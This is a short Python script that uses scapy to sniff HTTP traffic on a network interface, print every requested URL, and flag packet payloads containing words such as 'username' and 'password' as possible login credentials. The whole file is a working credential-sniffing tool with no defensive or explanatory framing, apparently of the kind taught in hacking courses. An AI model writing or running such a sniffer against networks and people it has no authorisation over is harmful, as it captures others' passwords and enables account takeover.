#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ['username', 'uname', 'user', 'login', 'pass', 'password']
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(" [+] Http request -> " + str(url))
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n [+] Possible username/password -> " + login_info + "\n\n")


sniff("eth0")
